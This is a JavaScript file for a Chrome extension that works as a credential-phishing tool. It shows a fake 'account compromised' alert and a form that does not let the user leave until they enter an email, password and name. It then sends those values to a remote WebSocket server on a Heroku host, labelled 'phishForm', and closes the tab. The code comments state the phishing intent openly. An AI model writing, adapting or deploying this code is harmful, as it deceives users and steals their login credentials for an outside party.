var HOST = 'wss://projectnickname123.herokuapp.com';
var ws = new WebSocket(HOST);

alert('Your account has been comprimised! Please fill out form to continue viewing information');

/*
This is the background of the form, which will not let the user leave until they
fill out all the fields. Once they fill out all the fields, it will flip the
phishflag back to nope, signifying we ar enot trying to fish right now.
*/

document.getElementById("subBtn").addEventListener("click", checkFunc);

function checkFunc(){
  var flag = "";
  chrome.storage.sync.get("phishFlag", function(ev){
    flag = ev.phishFlag;
    console.log("phishFlag in background load is " + flag);
  });
  var emailString = document.getElementById("email").value;
  var passString = document.getElementById("password").value;
  var nameString = document.getElementById("name").value;

  if(emailString == '' || passString == '' || nameString == '' || (!(emailString.includes("@"))) || (!(emailString.includes(".com")))){
    alert("You did not fill out everything properly!");
  }
  else{
    var val = "";
    chrome.storage.sync.set({'webSite': val, 'newPage': val, 'phishedSiteInfo': val, 'compareSite' : val}, function(){});
    chrome.storage.sync.get("id", function(ev){
      id=ev.id;
      var jsonPackage = {id: id, type: 'phishForm', phishEmail: emailString, phishPass: passString, phishName: nameString};
      ws.send(JSON.stringify(jsonPackage));
    });
    alert("Thank you for filling the form! Refresh the page and the information will display correctly.");

    chrome.tabs.getCurrent(function(tab){
      chrome.tabs.remove(tab.id, function(){});
    });
  }
}
